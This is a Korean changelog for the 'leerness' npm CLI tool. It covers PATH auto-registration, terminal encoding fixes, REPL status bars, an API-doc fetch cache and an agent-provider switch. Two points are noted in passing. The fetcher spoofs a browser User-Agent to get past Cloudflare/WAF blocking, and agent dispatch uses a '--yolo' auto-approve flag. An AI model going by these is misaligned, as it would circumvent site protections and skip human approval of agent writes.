   - `_winPathPsScript(bin)` — Windows User PATH 등록 PowerShell 스크립트 생성 (실행과 분리)
   - `_unixPathBlock(bin)` — Unix shell-rc export 블록 생성 (마커 멱등)
   - `_registerPath` — `process.platform` → `diag.platform` (테스트 시 플랫폼 주입 가능)
3. **8종 헬퍼 module.exports** (test 인프라)

### 실제 테스트/디버그 결과 (stress-v200, 실 PATH 미변경)
- **Unix shell-rc 실제 등록**: temp 파일에 1차 등록(shell-rc) → 2차 멱등(already, export 1줄만) → 마커 존재 → 기존 rc 내용 보존(append-only) ✓
- **Windows PS-script**: User scope SetEnvironmentVariable / setx 미사용(truncation 회피) / -notcontains 멱등 가드 / bin JSON 이스케이프 ✓
- **edge**: globalBin null → ok=false / shellRc null → ok=false / _dirInPath trailing-slash 정규화 ✓

### stress-v200 — **27/27 PASS · 100%**
- 테스트 인프라 (4): require.main 가드 + 8종 export + CLI 동작
- Unix 실제 등록 (5) + Windows PS (4) + edge (5) + 성능/누적 회귀 (9)

### 자동 release (117 main-push streak · 78 npm publish streak · R211)

🧪 **PATH 등록 실증 + 테스트 인프라** — require.main 가드로 내부 함수 단위 테스트 가능 (이후 라운드 회귀 강화 기반).

---

## 1.9.254 — 2026-05-29 — UR-0019 leerness CLI PATH 자동 등록

**🔗 사용자 명시 (UR-0019): "leerness 설치 시 leerness CLI가 PATH를 자동으로 등록될 수 있게 구현". (테스트/디버그는 다음 라운드 참고)**

### 배경
`npm i -g leerness` 설치 후 npm global bin 디렉토리가 PATH에 없으면 `leerness` 명령이 동작하지 않음 (특히 Windows nvm/수동 Node 설치 환경). 설치 직후 자동 감지 + 안전 등록.

### 구현 (`leerness path-setup [--apply] [--json]` + install 자동 안내)
1. **진단 헬퍼 5종**:
   - `_npmGlobalBin()` — `npm prefix -g` 기반 global bin 감지 (Windows=prefix, Unix=prefix/bin, fallback=node dir)
   - `_dirInPath(dir)` — 플랫폼별 정규화(대소문자/구분자/trailing slash) 후 PATH 포함 확인
   - `_leernessResolvable()` — `where`/`which` 로 실제 실행 가능 여부
   - `_pathDiagnose()` — globalBin/inPath/resolvable/shellRc 종합
   - `_registerPath(diag)` — 플랫폼별 안전 등록
2. **플랫폼별 안전 등록**:
   - **Windows**: PowerShell `[Environment]::SetEnvironmentVariable('PATH', ..., 'User')` — User scope (관리자 권한 불요), `setx`의 1024자 truncation 회피, 멱등(중복 시 EXISTS)
   - **Unix**: shell rc(`.zshrc`/`.bashrc`/`.profile`) 에 `export PATH` 블록 append — 마커(`# >>> leerness PATH`)로 멱등
3. **안전 원칙** (글로벌 룰: 안정성 > 성능, 엄격 처리):
   - **dry-run 기본** — `--apply` 명시해야 실제 등록
   - **멱등** — 이미 등록/PATH 포함 시 "등록 불필요"
   - **append-only** — 기존 PATH 덮어쓰기 절대 없음
4. **install 완료 자동 안내**: PATH 미등록 감지 시 `🔗 leerness CLI PATH 미등록` + `path-setup --apply` 안내. opt-out `LEERNESS_NO_PATH_CHECK=1`
5. **env summary 힌트** + `path` 별칭

### 다음 라운드 참고 (사용자 명시)
- 실제 `--apply` 등록 동작 깊은 테스트/디버그 (Windows User PATH 반영 확인, Unix rc source 후 동작)
- 신규 셸 세션에서 PATH 반영 검증

### stress-v199 — **25/25 PASS · 100%**
- 1.9.254 (12): VERSION + 헬퍼 5종 + dispatch + Windows PS/Unix rc 등록 + dry-run + install 안내 + 실제 실행(진단/json/별칭/정규화) + env 힌트
- 성능 (1): cold start avg 434ms
- 누적 회귀 (12): 1.9.207~253

### 자동 release (116 main-push streak · 77 npm publish streak · R210)

🔗 **설치 후 즉시 사용 가능** — npm global bin PATH 누락 자동 감지 + 안전 등록 (opt-in).

---

## 1.9.253 — 2026-05-29 — CLAUDE/AGENTS 문서 누적 갱신 (1.9.238~252 drift 차단)

**📚 문서 drift 차단: 메타 지침서가 1.9.237에 멈춰 있어 15 라운드(1.9.238~252) 미반영 → 누적 갱신.**

### 배경
CLAUDE.md / AGENTS.md(AI 에이전트 핸드오프 핵심 지침)가 마지막으로 1.9.237까지만 반영. 1.9.238~252의 사용자 명시 백로그 UR-0013~0018 6 요청이 문서에 없어, 새 세션 AI가 최신 기능(py-check, env encoding, api-skill, agy, 인코딩 자동회복)을 인지 못 할 drift 위험. (기존 패턴: 1.9.171/214/238 doc-sync 라운드 계승)

### 구현 (문서 전용 — 코드 변경 없음, VERSION bump만)
1. **CLAUDE.md**: "사용자 명시 백로그 UR-0013~0018 (1.9.239~252)" 섹션 추가
   - UR-0013 py/agent-mode · UR-0014 env encoding · UR-0015 api-skill · UR-0016 REPL UX · UR-0017 agy · UR-0018 인코딩 자동회복(4 라운드 상세)
   - 마일스톤 1.9.237→1.9.252 갱신 (R208 · 114 main-push · 75 npm · JSON 11 필드 · MCP 70 · CLI 57)
2. **AGENTS.md**: UR-0013~0018 백로그 테이블 + UR-0018 4 라운드 상세 + 5축 매트릭스 유지 표기 + 마일스톤 1.9.252
3. session-workflow.md는 gitignored 생성 메타파일(6단계 워크플로 템플릿) — 기능 로그 대상 아님, 갱신 제외

### stress-v198 — **21/21 PASS · 100%**
- 1.9.253 (8): VERSION + CLAUDE/AGENTS 백로그·UR-0018·마일스톤·11필드·stale 참조 해소
- 성능 (1): cold start avg 394ms
- 누적 회귀 (12): 1.9.207~252

### 자동 release (115 main-push streak · 76 npm publish streak · R209)

📚 **AI 핸드오프 지침 최신화** — 새 세션 에이전트가 UR-0013~0018 기능을 즉시 인지, drift 0 유지.

---

## 1.9.252 — 2026-05-29 — UR-0018 마무리: env DRY 통합 + agent-mode 인코딩 점검

**🧹 UR-0018 코드 정리: 1.9.249~251 누적된 인코딩 분기 중복을 단일 헬퍼로 일원화.**

### 배경
1.9.249(Windows)/1.9.250(POSIX)/1.9.251(헬퍼 신설) 진행 중, `env summary`에는 여전히 인라인 Windows/POSIX 분기가 중복으로 남아 있었음 (1.9.251에서 헬퍼는 만들었으나 env summary는 미적용). 코드 일관성(DRY)과 자율 모드 진입점 보강.

### 구현
1. **env summary DRY 통합**:
   - 인라인 Windows(CP949) + POSIX(LANG UTF-8) 분기 ~20줄 → `_terminalEncodingNotice()` 단일 호출로 교체
   - 출력 동일성 유지 (회귀 테스트 A6/A8로 검증) — 단일 소스로 일원화
2. **agent-mode start 인코딩 점검 추가**:
   - 자율 모드 진입(`leerness agent-mode start`) 시에도 인코딩 점검 (init과 동일 정책)
   - `!enc.ok` 가드 — 위험할 때만 노출 (정상 환경 노이즈 0)
   - `🌐 터미널 인코딩 점검 (1.9.252, UR-0018)` 헤더

### 영향 받지 않은 영역
- _terminalEncodingNotice 헬퍼 (1.9.251) · install 호출 (1.9.251) 유지
- JSON envInfo 4 필드 (1.9.249/250) · IIFE chcp 자동회복 (1.9.249) 유지
- handoff JSON 11 필드 매트릭스 유지

### stress-v197 — **21/21 PASS · 100%**
- 1.9.252 (8): VERSION + env DRY 통합 + 인라인 제거 검증 + agent-mode 점검 + 가드 + 출력 회귀 + 헬퍼 단일정의 + 구조 보존
- 성능 (1): cold start avg 394ms
- 누적 회귀 (12): 1.9.207~251

### 자동 release (114 main-push streak · 75 npm publish streak · R208)

🧹 **UR-0018 코드 일관성 완결** — 4 라운드(1.9.249~252) 누적 인코딩 로직을 단일 헬퍼로 정리, 진입점 3곳(init/agent-mode/env) 일관 적용.

---

## 1.9.251 — 2026-05-29 — UR-0018 3단계 init 터미널 인코딩 점검 안내

**🌐 UR-0018 완성: 자동 회복(1.9.249/250)에 이어 `leerness init` 시 사용자 즉시 고지.**

### 배경
UR-0018 원문에 명시된 *"leerness init 시 터미널 인코딩 점검 안내"* 부분이 미구현 상태. 1.9.249(Windows chcp)/1.9.250(POSIX)는 자동 회복에 집중했으나, 설치 직후 사용자에게 현재 인코딩 상태를 보여주는 가시화는 빠져 있었음.

### 구현
1. **`_terminalEncodingNotice()` 재사용 헬퍼 신설**:
   - Windows(CP949) + POSIX(Linux/macOS/WSL) 양방향 점검을 한 곳에 통합
   - 반환 `{ ok, lines[] }` — 색상 적용된 출력 라인 (호출측이 `log()`)
   - TTY 자동 감지 → 비-TTY 시 색상 코드 생략
2. **`leerness init` 완료 시 자동 호출** (`!opts.migration` 가드):
   - `🌐 터미널 인코딩 점검 (1.9.251, UR-0018)` 헤더 + 상태 라인
   - 위험 시 `상세: leerness env · 셸 스크립트 검사: leerness env encoding` 안내
   - 안전(65001/UTF-8) 시 `✓` 초록 표시
3. migration(재설치)에서는 노이즈 방지를 위해 skip

### 영향 받지 않은 영역
- 1.9.249 chcp 65001 자동 회복 + 1.9.250 POSIX posixEncodingOk/isWSL 모두 유지
- JSON envInfo 4 필드 (terminalEncodingOk/autoChcpApplied/posixEncodingOk/isWSL) 유지
- env summary 인라인 인코딩 라인 (1.9.249/250) 유지 — 헬퍼와 독립

### stress-v196 — **21/21 PASS · 100%**
- 1.9.251 (8): VERSION + 헬퍼 + 반환구조 + install 호출 + Windows/POSIX 분기 + migration skip + 실제 init 출력
- 성능 (1): cold start avg 471ms
- 누적 회귀 (12): 1.9.207~250

### 자동 release (113 main-push streak · 74 npm publish streak · R207)

🌐 **UR-0018 3단계 완성** — 자동 회복 + 설치 시 가시화로 한국어 인코딩 보호 전체 사이클 완결.

---

## 1.9.250 — 2026-05-28 — UR-0018 2단계 POSIX 인코딩 자동 회복 (Linux/macOS/WSL)

**🌐 UR-0018 후속: Windows + POSIX 양방향 인코딩 보호 완성.**

### 배경
1.9.249는 Windows (CP949 → 65001) 에 집중. POSIX (Linux/macOS) 한국어 환경 + WSL 사용자도 LANG/LC_ALL 미설정 시 동일한 한글 깨짐 발생.

### 구현
1. **`_collectRuntimeEnv` 확장** (locale 필드):
   - `posixEncodingOk: boolean | null` — LANG/LC_ALL/LC_CTYPE 에 UTF-8 포함 여부
   - `isWSL: boolean` — `/proc/version` "microsoft" 매칭 또는 `WSL_DISTRO_NAME` env
2. **env summary**:
   - `✓ POSIX locale UTF-8 — Linux/macOS (WSL) 한국어 출력 안전`
   - `⚠ POSIX locale에 UTF-8 없음 (LANG=…) — 한국어 출력 깨질 위험`
   - `→ 권장: export LANG=ko_KR.UTF-8 (또는 export LC_ALL=C.UTF-8)`
3. **handoff body**:
   - `## ⚠ 터미널 인코딩 — POSIX(WSL) locale에 UTF-8 없음 (1.9.250, UR-0018 2단계)`
   - `~/.bashrc 또는 ~/.zshrc 에 추가` 영구 적용 안내
4. **JSON envInfo 4필드 propagate** (handoff/session close/health 3 명령 일관성):
   - `terminalEncodingOk` (1.9.249) — 이전 라운드에서 handoff 만 적용 → session close/health 추가
   - `autoChcpApplied` (1.9.249) — 동일 propagate
   - `posixEncodingOk` (1.9.250 신규)
   - `isWSL` (1.9.250 신규)

### 영향 받지 않은 영역
- Windows chcp 65001 자동 회복 (1.9.249) 유지
- 1.9.248 agy / 1.9.247 fallback / 1.9.246 status bar / 1.9.245 api-skill 모두 유지
- handoff JSON 11 필드 매트릭스 유지

### stress-v195 — **26/26 PASS · 100%**
- 1.9.250 (12): VERSION + IIFE + POSIX UTF-8 검사 + WSL 감지 + env summary + handoff body + JSON 3 명령 propagate (4 필드)
- 성능 (2): cold start avg 368ms · env summary --json avg 1120ms
- 누적 회귀 (12): 1.9.207~249

### 자동 release (112 main-push streak · 73 npm publish streak · R206)

🌐 **양방향 인코딩 보호 완성** — Windows + POSIX 모두 leerness 자체 출력 한글 깨짐 사전 차단.

---

## 1.9.249 — 2026-05-28 — UR-0018 터미널 인코딩 자동 회복 (한국어 Windows)

**🌐 사용자 명시 (UR-0018): "leerness가 적용된 프로젝트에서 터미널 출력이 깨지지 않게, 하드웨어의 언어 등을 사전에 참고하여 진행".**

### 배경
사용자 보고: `.harness/protected-files.md` 출력에서 "?뚯씪 ??젣/?뺣━" 패턴 (UTF-8 → CP949 오해석) 발생. 한국어 Windows 기본 코드페이지(CP949, 949)에서 leerness가 UTF-8로 출력한 한글이 깨져 보이는 문제.

### 구현 (bootstrap 자동 회복 + 가시화)
1. **`_ensureStdoutEncoding()` IIFE** (harness.js bootstrap, DEP0190 다음):
   - `process.stdout/stderr.setEncoding('utf8')` 즉시 강제
   - Windows + 비-65001 코드페이지 감지 시 → `chcp.com 65001` 자동 호출 (best-effort)
   - 결과를 `process.env._LEERNESS_AUTOCHCP_APPLIED` 에 기록
   - 무한 재호출 방지: `_LEERNESS_CHCP_DONE='1'` 자식 process 가드
   - opt-out: `LEERNESS_NO_AUTOCHCP=1`
2. **env summary** 강화:
   - "터미널 인코딩 UTF-8 (65001) — 안전" / "터미널 코드페이지 CP949 — 한국어 출력 깨짐 위험" 명시
3. **handoff body** 한국어 Windows + 비-65001 시 경고 섹션 추가
4. **JSON envInfo** 신규 2필드:
   - `terminalEncodingOk: codepage === 65001`
   - `autoChcpApplied: process.env._LEERNESS_AUTOCHCP_APPLIED` (적용된 이전 코드페이지)
5. **BUG fix** (`_collectRuntimeEnv`): chcp 출력 파싱 regex `\d{3,4}` → `\d{3,5}` (65001 5자리 캡처)

### 영향 받지 않은 영역
- 1.9.248 agy / 1.9.247 fallback / 1.9.246 status bar / 1.9.245 api-skill / 1.9.244 HOTFIX 모두 유지
- handoff JSON 11 필드 매트릭스 유지 (envInfo 확장)

### stress-v194 — **23/23 PASS · 100%**
- 1.9.249 (10): VERSION + IIFE bootstrap + chcp 자동/opt-out/재호출 가드 + env summary + handoff body + JSON envInfo 2필드 + 실제 응답 (terminalEncodingOk=true) + env summary 실제 출력
- 성능 (2): cold start avg 385ms (autochcp 포함) · 357ms (opt-out)
- 누적 회귀 (11): 1.9.207~248 + 보안

### 자동 release (111 main-push streak · 72 npm publish streak · R205)

🌐 **사용자 환경 자동 회복** — Windows 한국어 사용자의 한글 깨짐을 코드페이지 차원에서 사전 차단.

---

## 1.9.248 — 2026-05-26 — UR-0017 Gemini CLI 제거 + Antigravity CLI (agy) 도입

**🔄 사용자 명시 (UR-0017): Gemini CLI 제거 + Antigravity (agy) CLI 전체 교체.**

### 변경 범위 (65 occurrences case-insensitive)
- **EXTERNAL_AGENTS**: `gemini` → `agy` (bin/envFlag/install 안내 모두 교체)
- **_PROVIDER_CYCLE_ORDER**: `['ollama', 'claude', 'codex', 'agy', 'copilot']` (Tab cycle)
- **_PROVIDER_MODEL_CATALOG.agy**: `antigravity-pro/flash/experimental` 모델 (1M+ context)
- **환경변수**: `LEERNESS_ENABLE_GEMINI` → `LEERNESS_ENABLE_AGY`
- **CLI bin**: `gemini -p` → `agy -p` (1-shot + REPL stream + dispatch)
- **agents dispatch --write**: `gemini --yolo` → `agy --yolo`
- **setup-agents UI**: "Gemini (gemini CLI)" → "Antigravity (agy CLI)"
- **handoff body sub-agent display** (1.9.246 status bar): allAgents = ['claude', 'codex', 'agy', 'copilot']
- **MCP description**: agents_list / provider_list 등 5종 → agy 명시
- **REPL :provider validation**: validProviders = ['ollama', 'claude', 'codex', 'agy', 'copilot']
- **.harness/leerness-config.json**: LEERNESS_ENABLE_AGY 기본값 "0"
- **scripts/e2e.js**: 회귀 테스트 — agents quota/dispatch/list/register-pending 모두 agy
- **install hint**: `npm i -g @google/antigravity-cli` (https://antigravity.google.com)

### 영향 받지 않은 영역
- 1.9.247 multi-provider fallback (agy 도 자동 fallback 대상)
- 1.9.246 status bar (agy 5종 한 줄 표시)
- handoff JSON 11 필드 (apiSkills/envInfo 등) 유지

### stress-v193 — **23/23 PASS · 100%**
- 1.9.248 (12): VERSION + EXTERNAL_AGENTS 교체 + 모델 catalog + Tab cycle + setup-agents UI + handoff status bar + dispatch + quota + list + config.json + validation + nonsecret keys
- 성능 (1): cold start avg 419ms
- 누적 회귀 (10): 1.9.207~247

### 자동 release (110 main-push streak · 71 npm publish streak · R204)

🔄 **Gemini CLI 단계적 제거 → Antigravity (agy) 전환** — 사용자 환경 변화 즉시 반영

---

## 1.9.247 — 2026-05-26 — UR-0016 2단계 + UR-0015 2단계

**🔁 REPL multi-provider auto-fallback + 📚 api-skill audit 통합.**

### 1. UR-0016 2단계 — REPL multi-provider auto-fallback
사용자 보고 (1.9.246 스크린샷): `codex CLI 응답 실패 (exit=null)` → 멀티 provider auto-fallback 검토.

**구현:**
- `state.autoFallback` 필드 추가 (default OFF — opt-in)
- 활성화: `:fallback on` (REPL slash) 또는 `LEERNESS_REPL_AUTO_FALLBACK=1` env
- transient 실패 (`exit=null|timeout`) 감지 시 next ready agent 로 자동 전환 + 재시도 1회
- 응답 헤더: `↪ auto-fallback (1.9.247): codex 실패 → claude 자동 전환 + 재시도 중...`
- 성공 시 `✓ fallback 성공 [claude/...]`, 실패 시 친절한 진단 + 수동 :provider 안내

### 2. UR-0015 2단계 — api-skill audit 통합
사용자 명시 (UR-0015): *"AI가 정리해둔 파일이 참조되는지 확인"*

**구현:**
- `audit` 명령에 새 finding 추가: `api_skill_missing`
- 현재 in-progress task 의 request/nextAction/evidence 에 API 키워드 (`API|endpoint|REST|GraphQL|OAuth|webhook|http[s]?://`) 감지
- 매칭되는 api-skill 0건 → `warn` + `leerness api-skill add <url> --direction "..."` 안내
- 매칭 1+건 → `✓ API skill 매칭 OK (현재 task → N건)` 로그
- non-API task 는 영향 없음

### 3. 누적 회귀 (1.9.207~246) — 모두 유지
- REPL UX status bar (1.9.246) · api-skill cache (1.9.245) · _lastCycleLines HOTFIX (1.9.244)
- CJK 분류 (1.9.243) · env encoding --apply (1.9.242) · 모두 유지
- handoff JSON 11 필드 · MCP 70 도구 · agents dispatch 거부 회귀 (1.9.246 flake 방지) 검증

### 4. stress-v192 — **20/20 PASS · 100%**
- 1.9.247 (8): VERSION + autoFallback state + :fallback slash + 재시도 로직 + audit api_skill_missing + 실제 동작 (3 시나리오)
- 성능 (1): cold start avg 588ms
- 누적 회귀 (11): 1.9.207~246 + 보안 + e2e flake 방지

### 5. 자동 release (109 main-push streak · 70 npm publish streak · R203)

🔁 **사용자 실 환경 대응 보강** — 1.9.246 보고된 codex CLI exit=null 케이스 자동 회복 + 후속 API task UR-0015 자동 참조 확인.

---

## 1.9.246 — 2026-05-26 — UR-0016 REPL UX/UI 개선

**🎯 사용자 명시 (UR-0016): REPL agent 채팅 입력칸 옆 컨텍스트 게이지 + 서브 에이전트 가시화 + 정상 완료 초록색 강조.**

### 사용자 명시 (UR-0016)
> *"REPL agent 모드의 기능과 UX UI를 개선해줘: 서브 에이전트 활성화 여부, 채팅입력칸 근처에는 컨텍스트 창 게이지 등 표시, 정상완료된 작업은 초록색 등으로 표시. 별도의 신규 프로젝트를 생성하여 직접 REPL agent 모드를 구동하여 유저가 사용하기 쉽게 개선해줘."*

dogfood 검증: `C:\Users\leehy\AppData\Local\Temp\dogfood-1.9.246` 신규 프로젝트에서 `leerness init` + REPL 진입 흐름 직접 검증.

### 1. 컨텍스트 창 게이지 (채팅 입력칸 직전 자동 표시)
모든 prompt 호출 직전에 status bar 한 줄 자동 출력:
```
💬 ctx 12msg ~3.4k/200k ████░░░░░░░░░░ 1.7%  ·  agents: *claude ✓codex ·gemini ·copilot  ·  ▶stream
```
- `ctx Nmsg` — 누적 대화 메시지 수
- `~XXk/YYk` — 추정 토큰 / provider별 컨텍스트 윈도우 (claude 200k, claude-4-7 1M, gpt-5 200k, gpt-4.1 1M, gemini 1M, copilot 64k, ollama 8k)
- `████░░░░░░░░░░ %` — 14문자 progress bar (50% 이상 cyan, 80% 이상 yellow 경고)
- 토큰 추정 휴리스틱: `chars / 3.5` (CJK/영문 평균치)

### 2. 서브 에이전트 활성화 가시화 (한 줄 5종 표시)
- `*claude` — 현재 활성 provider (bold + green)
- `✓codex` — 설치+인증 완료 ready (green)
- `·gemini` — 미설치 또는 비활성 (dim)
- 5종 모두 한 줄에 표시 → 사용자가 즉시 다른 provider 가용성 인지 → Tab 키로 전환

### 3. 정상 완료 작업 초록색 강조 (사용자 명시)
- assistant 응답 헤더에 `✓` 마커 + `C.green()` 적용
- stream 모드: `✓ [assistant: claude/sonnet-4-7, role=actor, 1234ms · 567자]` (green)
- non-stream: `✓ assistant (claude, role=actor, 1234ms)` (green bold)
- 기존 `[assistant: ...]` (dim) → `✓ [assistant: ...]` (green)

### 4. dogfood 신규 프로젝트 직접 구동 검증
- 임시 디렉토리에 빈 프로젝트 생성 → `leerness init` 정상 동작 확인
- `leerness agent --interactive` 진입 흐름 검증 (provider 없음 시 안내 출력)
- `--version` 등 핵심 명령 동작 확인

### 5. promptWithStatus wrapper 도입
- `rl.prompt()` 7회 호출처 모두 `promptWithStatus()` 로 통일
- line handler / cycle / 초기 진입 등 일관된 status bar 노출
- wrapper 내부 1건만 실제 `rl.prompt()` 호출 (DRY)

### 6. 누적 회귀 (1.9.207~245) — 모두 유지
- api-skill cache (1.9.245) + CJK 분류 (1.9.243) + env encoding --apply (1.9.242) + 모두 유지
- handoff JSON 11 필드 · MCP 70 도구 · CJK + py-check + 비정상종료 모두 유지

### 7. stress-v191 — **23/23 PASS · 100%**
- 1.9.246 (11): VERSION + 4 helper + promptWithStatus + 컨텍스트 bar + sub-agent 가시화 + 초록색 ✓ + dogfood init + 통일성
- 성능 (1): cold start avg 378ms
- 누적 회귀 (11): 1.9.207~245

### 8. 자동 release (108 라운드 main-push streak · 69 라운드 npm publish streak · R202)

🎯 **REPL UX 사용자 요구 100% 반영** — 컨텍스트 + 에이전트 + 초록색 강조 통합 status bar.

---

## 1.9.245 — 2026-05-26 — UR-0015 API skill cache

**📚 사용자 명시 (UR-0015): API 문서/관련링크 자동 정리 + AI 자동 참조 시스템.**

### 사용자 명시 (UR-0015)
> *"API 문서/기능 요청 시 공식 문서·AI 탐색 내용을 스킬처럼 .harness/api-skills/ 에 정리하고 방향 지시도 함께 기록. 이후 같은 API 관련 수정/구현 요청 시 AI 가 정리해둔 파일이 자동 참조. URL 제공 시 본 URL + 관련 링크의 기능까지 참조."*

검증 예시: 쿠팡 상품 생성 API (https://developers.coupangcorp.com/hc/ko/articles/360033877853) — 실 fetch 성공 (title "상품 생성 - Open APIs" + 7 관련 링크 자동 수집).

### 1. `leerness api-skill` CLI 5종
- `add <url> [--direction "방향"] [--name "..."] [--no-crawl] [--skeleton]` — fetch + same-domain 관련 링크 1단계 crawl (max 10) → `.harness/api-skills/<id>.md`
- `list [--json]` — 저장된 skill 목록
- `show <id>` — 특정 skill 본문 출력 (AI 컨텍스트 적재용)
- `match <query> [--json]` — task 키워드 매칭 (CJK 한글 2자+ / ASCII 3자+ 모두 지원)
- `drop <id>` — 삭제

### 2. URL Fetch 방식 — 의존성 0 (Node built-in https)
- Mozilla 호환 User-Agent (Cloudflare/WAF 차단 회피)
- timeout 10s · max body 1MB · max 5 redirects
- HTML→text 변환 (script/style 제거, entity decode)
- same-domain 관련 링크 추출 (max 10, depth=1)
- 차단 시 (403/401/429) `--skeleton` fallback → 빈 .md 골격 생성

### 3. 자동 참조 — handoff body 자동 노출
- 현재 in-progress task description 키워드 + skill 매칭 → `## 📚 관련 API skill N건 발견 (참조 권장)`
- 본 URL + 방향 + 도메인 표시 (top 3)
- 매칭 0 시: 저장된 skill 수만 hint 표시

### 4. JSON 11번째 통합 필드 `apiSkills` (handoff/session close/health)
- `{ total, matched, matchedIds, ids }` — 외부 AI 가 단일 호출에서 API skill 컨텍스트 회수
- JSON 통합 매트릭스 10 → **11 필드** (3 명령 × 11 = 33 통합 포인트)

### 5. MCP **70번째 도구** `leerness_api_skill` 🎉
- sub: list / show / match / add / drop (외부 AI 가 MCP 호출로 직접 사용)

### 6. 누적 회귀 (1.9.207~244) — 모두 유지
- REPL HOTFIX (1.9.244) + CJK 분류 (1.9.243) + env encoding --apply (1.9.242) + 모두 유지

### 7. stress-v190 — **26/26 PASS · 100%**
- 1.9.245 신규 (15): VERSION + helper 함수 + CLI 5종 + 실 fetch + JSON 11 필드 × 3명령 + body 매칭 + skeleton fallback + MCP 70
- 성능 (1): cold start avg 331ms
- 누적 회귀 (10): 1.9.207~244

### 8. 자동 release (107 라운드 main-push streak · 68 라운드 npm publish streak)

📚 **API 지식 자동 누적·재사용** — 사용자가 한 번 정리하면 AI가 영구 기억. R201 진입.

---

## 1.9.244 — 2026-05-26 🎉 R200 + 🚨 HOTFIX

**🚨 HOTFIX: REPL agent ReferenceError `_lastCycleLines` (1.9.189 회귀 버그) + 🎉 R200 마일스톤 도달.**

### 🚨 사용자 보고 버그 (실 환경 1.9.243 npx 설치)

```
agent[claude · sonnet-4-7/actor/▶]> 웹페이지 제작해줘
.../leerness/bin/harness.js:16839
      _lastCycleLines = 0;  // 1.9.189: 사용자 입력 시 cycle overwrite 추적 reset
                      ^
ReferenceError: _lastCycleLines is not defined
    at Interface.<anonymous> (.../harness.js:16839:23)
```

**원인:** `let _lastCycleLines = 0;` 변수가 `if (isTty) { try { ... } }` 블록 스코프 내부에 선언되어 있었음 (line 16418). `rl.on('line')` 핸들러는 외부 스코프 (line 16836+) 라서 ReferenceError.

**Fix (1.9.244):**
- `let _lastCycleLines = 0;` 를 outer function 스코프 (line 16399) 로 hoist
- 두 곳 (cycleProvider/cycleModel + rl.on('line') 핸들러) 동일 closure 공유
- 검증: stress-v189 A5 — REPL agent 진입 + stdin input → no ReferenceError 확인

### 🎉 R200 마일스톤 도달

- v1.9.6 baseline ~ v1.9.244 → **200 누적 라운드** (round-history JSON: `roundCount=200`)
- **106 main-push streak** (1.9.140~) · **🎉 67 npm publish streak** (1.9.178~)
- handoff/session close/health JSON **10 필드** × 3 = 30 통합 포인트
- MCP **69 도구** · CLI **56 명령** · 9 카테고리
- 6 능력 매트릭스 + 5축 매트릭스 100/100

### 누적 회귀 (1.9.207~243) — 모두 유지
- CJK 분류 (1.9.243) · env encoding --apply (1.9.242) · env summary (1.9.241) · py-check (1.9.239)
- 비정상종료 + delivered + release cleanup + round-history + milestones + recentChanges + 모든 1.9.207~218 사용자 명시 신규 7종

### stress-v189 — **20/20 PASS · 100%**
- 1.9.244 HOTFIX (6): VERSION + _lastCycleLines 단일 선언 + 15 refs + hotfix 주석 + agent input no-crash + agent --help no-crash
- R200 마일스톤 (1): roundCount=200 확인
- 성능 (1): cold start avg 373ms
- 누적 회귀 (12): 1.9.170~243

🚨 **사용자 보고 버그 즉시 패치** — 실 환경 1.9.243 사용 중 발견된 critical REPL 크래시 회복.
🎉 **R200 자율 모드 마일스톤** — 200 라운드 동안 단 한 번도 자율 흐름 끊김 없이 진행.

---

## 1.9.243 — 2026-05-26

**🌏 UR-0014 3단계: CJK 다국어 분류 (한국어/일본어/중국어) + session close --auto-fix-encoding + handoff body --apply 진입점.**

### 사용자 명시 (UR-0014) — 3단계 다국어 보강 + 마감 자동화

1.9.241 (감지) → 1.9.242 (자동 수정) → 1.9.243 (다국어 + 마감 자동 통합):

### 1. CJK 분류 — Korean/Japanese/Chinese 자동 식별
- `_scanShellScriptsEncoding()` 에 `riskType` 필드 추가
- UTF-8 byte range 분류:
  - Korean (Hangul U+AC00-D7AF) → 0xEA-0xED 시작 → CP949 위험
  - Japanese (Hiragana/Katakana U+3040-30FF) → 0xE3 시작 → CP932 (Shift-JIS) 위험
  - Chinese (CJK Unified U+4E00-9FFF) → 0xE4-0xE9 시작 → CP936 (GBK) 위험
- `atRisk[].cjk`: { korean, japanese, chinese, other } 세부 카운트
- `result.riskTypeCounts`: 분류별 요약 통계
- Locale 별 정확한 위험 메시지 ("Windows 한국어/일본어/중국어 PowerShell 에서 CPxxx 로 오인식 가능")

### 2. session close --auto-fix-encoding 마감 자동 회복
- 1.9.224 (--auto-apply-delivered) + 1.9.237 (--auto-cleanup-branches) 패턴 확장
- 마감 시 셸 스크립트 인코딩 위험 자동 BOM 추가
- 기본: 안내만 (`자동 회복 가능` hint) · `--auto-fix-encoding` 명시 시에만 변경
- agent-mode stop 흐름에 자동 chain (`session close --auto-apply-delivered --auto-cleanup-branches --auto-fix-encoding`)

### 3. handoff body --apply 진입점 표시
- 인코딩 위험 발견 시 본문에 자동 안내 2줄 추가:
  - `→ 자동 회복: leerness env encoding --apply (UTF-8 BOM 자동 추가, 1.9.242)`
  - `→ 마감 시 자동: session close --auto-fix-encoding (1.9.243)`
- CJK 분류 요약 표시: `분류: korean=N, japanese=M, chinese=K (1.9.243 CJK)`

### 4. 누적 회귀 (1.9.207~242) — 모두 유지
- MCP 69 도구 유지
- JSON 통합 10 필드 (envInfo) 유지
- drift check --auto-fix env encoding 통합 유지

### 5. stress-v188 — **24/24 PASS · 100%**
- 1.9.243 (8): VERSION + CJK 3종 분류 정확도 + riskTypeCounts + atRisk[].cjk + session close 자동/기본 모드 + handoff body 진입점 + agent-mode stop chain
- 성능 (2): cold_start avg 333ms · session close --auto-fix 438ms
- 누적 회귀 (14): 1.9.207~242 + 보안 + npm publish

### 6. 자동 release (105 라운드 main-push streak · 66 라운드 npm publish streak)

🌏 **다국어 CJK 완전 자동화** — Korean/Japanese/Chinese PowerShell 인코딩 오인식 사전 차단

---

## 1.9.242 — 2026-05-26

**🌐 UR-0014 2단계: env encoding --apply (BOM 자동 추가) + JSON 10 필드 envInfo + drift --auto-fix 통합.**

### 사용자 명시 (UR-0014) — 2단계 자동 회복

1.9.241 에서 감지만 제공했던 위험을 1.9.242 가 **실제 자동 수정**으로 확장:

### 1. `leerness env encoding --apply` 자동 BOM 추가
- `.ps1` / `.bat` / `.cmd` / `.sh` 의 위험 파일에 UTF-8 BOM (`EF BB BF`) 자동 prepend
- `--auto-fix-bom` 별칭 동일 동작
- 기본 dry-run 유지 (--apply 명시 시에만 변경) — 안전 원칙
- 적용 결과 `result.applied` 배열로 노출 (file/action: utf8-bom-added | failed)

### 2. handoff/session close/health --json **10 필드** envInfo 통합
- JSON 통합 매트릭스 9 → **10 필드** 진화 (3 명령 × 10 = 30 통합 포인트)
